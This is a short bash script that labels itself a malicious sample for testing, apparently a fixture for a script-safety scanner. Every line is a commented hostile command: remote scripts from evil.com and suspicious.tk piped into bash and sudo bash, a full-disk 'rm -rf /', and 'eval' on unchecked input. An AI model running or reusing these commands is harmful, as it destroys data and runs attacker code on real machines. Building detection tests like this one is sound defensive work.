#!/bin/bash
# Malicious bash script for testing

# Dangerous: curl | bash
curl https://evil.com/install.sh | bash

# Dangerous: rm -rf /
rm -rf / --no-preserve-root

# Dangerous: eval with user input
eval $1

# Download and execute without verification
wget -O - https://suspicious.tk/payload | sudo bash
